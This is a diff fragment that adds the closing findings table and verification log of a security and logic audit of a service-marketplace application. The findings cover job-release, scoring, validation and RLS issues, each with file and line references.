+| CRIT-02 | Critical | SLA auto-release only fires on `accepted`; `en_route`/`arrived` jobs permanently locked until weekly cron | `ops/marketplace-cron/route.ts:115–121`, `031_marketplace_v2_schema.sql:641–644` |
+| HIGH-01 | High | `GET /api/requests/quotes` accepts unvalidated string `request_id` — no UUID format check | `requests/quotes/route.ts:45–84` |
+| HIGH-02 | High | `GET /api/requests` performs state-mutating expiry write with no error handling | `requests/route.ts:136–149` |
+| HIGH-03 | High | `release_job_atomic` does not decrement `jobs_this_month` — V2 provider allowance under-counted | `028_stuck_job_auto_release.sql:61–78`, `031_marketplace_v2_schema.sql:566–569` |
+| HIGH-04 | High | `jobs_this_month` permanently inflated for stuck `en_route`/`arrived` jobs (consequence of CRIT-02) | `031_marketplace_v2_schema.sql:692–698`, `ops/marketplace-cron/route.ts:115–121` |
+| HIGH-05 | High | Rating row does not store `customer_id` — no DB-level audit trail linking rating to submitting customer | `ratings/route.ts:77–85`, `001_initial_schema.sql:57–64` |
+| HIGH-06 | High | Price-change respond UPDATE lacks `status = 'in_progress'` guard — stale approval possible on completed job | `customer/price-change/respond/route.ts:67–73` |
+| MED-01 | Medium | Ring eligibility (PPJ ring-1) and `visibility_reduced` penalty not enforced in quote submission API | `dispatch.ts:37–73`, `provider/jobs/quote/route.ts:82–101` |
+| MED-02 | Medium | Provider score uses `jobs_this_month` as lifetime completions — new-provider boost fires every month | `requests/quotes/route.ts:172–180`, `provider-score.ts:31` |
+| MED-03 | Medium | Customer cancel counter updated outside RPC — silently under-counts on DB failure | `requests/cancel/route.ts:158–170` |
+| MED-04 | Medium | `release_job_atomic` resets to `open` ignoring pending quotes; stale `selected_quote_id` not cleared | `028_stuck_job_auto_release.sql:48–54` |
+| MED-05 | Medium | Acceptance rate in scoring is tautological (`jobs_this_month / (jobs_this_month + 1)`) | `requests/quotes/route.ts:180`, `provider-score.ts:65–71` |
+| LOW-01 | Low | `advance_provider_job_state` RPC missing `SET search_path = public` | `026_advance_state_atomic.sql:19` |
+| LOW-02 | Low | Customer RLS on `request_quotes` exposes rejected/expired quotes with provider UUIDs | `031_marketplace_v2_schema.sql:93–106` |
+| LOW-03 | Low | `expire_stuck_active_requests` weekly cron does not decrement `jobs_this_month` | `028_stuck_job_auto_release.sql:88–145` |
+| LOW-04 | Low | `advance_provider_job_state` RPC does not whitelist valid `p_to_status` values | `026_advance_state_atomic.sql:25–52` |
+| LOW-05 | Low | SLA enforcement cron processes at most 50 requests per run — backlog under outage | `ops/marketplace-cron/route.ts:121` |
+| LOW-06 | Low | Migration files 033 and 034 each contain their function body defined twice | `033_nearby_requests_include_quoted.sql`, `034_cancel_allow_quoted_status.sql` |
+
+---
+
+## Verification Log
+
+- Source files read in this run: 31
+- Documentation files read in this run: 5 (CLAUDE.md, ARCHITECTURE.md, MARKETPLACE_V2_SPEC.md, PROJECT_HANDOFF.md, SECURITY_AUDIT_1.md; ROADMAP.md and SESSION_LOG.md not found in working directory)
+- Required files NOT opened: `033_marketplace_v2_helpers.sql` (file not found at that path; actual filename is `033_nearby_requests_include_quoted.sql` — read under that name)
+- Additional files opened beyond required list: `supabase/migrations/029_rpc_add_en_route_arrived_statuses.sql`, `supabase/migrations/033_nearby_requests_include_quoted.sql`, `supabase/migrations/034_cancel_allow_quoted_status.sql`, `supabase/migrations/037_rls_force_and_explicit_deny.sql`, `supabase/migrations/038_provider_kyc.sql`
+- Every finding traces to source lines read in this run: Yes
+- Findings inferred from old SECURITY_AUDIT_2.md: No (SECURITY_AUDIT_2.md did not exist before this run; only SECURITY_AUDIT_1.md was read for deduplication)
+- Source files modified: No
+
+---
+
+No source files were modified. This report is for review only.
